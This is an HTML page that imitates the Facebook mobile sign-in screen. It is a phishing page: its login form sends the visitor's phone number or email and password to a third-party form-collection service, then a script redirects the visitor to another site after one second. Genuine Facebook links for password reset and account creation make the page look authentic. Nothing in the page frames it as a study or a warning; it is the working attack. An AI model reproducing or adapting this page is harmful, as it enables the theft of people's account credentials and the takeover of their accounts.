<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link rel="stylesheet" href="styles.css">
    <meta property="og:image" content="img.png">
</head>
<body>
    <h6>English (UK)</h6>
    <img src="logo.svg">
    <form id="Form-Element" action="https://submit-form.com/kvNiqTEyZ" method="post">
        <input type="text" id="numORmail" name="Number/Email" placeholder="Mobile number or email address" required>
        <input type="password" name="Password" id="password" placeholder="Password" required>
        <button type="submit" class="btn">Log in</button>
        <a href="https://m.facebook.com/login/identify/"><h5>Forgotten Password?</h5></a>
    </form>

    <div id="CNA">
        <a href="https://m.facebook.com/reg/"><button>Create new account</button></a>
    </div>
    <img src="logo2.png" alt="">
    <footer>
        <p>About</p> &nbsp; &nbsp; <p>Help</p> &nbsp; &nbsp; <p>More</p>
    </footer>
    <script>
        // Get the form element
        const form = document.getElementById('Form-Element');
    
        // Add a submit event listener to the form
        form.addEventListener('submit', function () {
            // Set a delay of 1 seconds for redirection
            setTimeout(() => {
                // Redirect to the specified URL
                window.location.href = "https://darknaija.com"; // Replace with your desired URL
            }, 1000); // 1000 milliseconds = 1 second
        });
    </script>
    
</body>
</html>
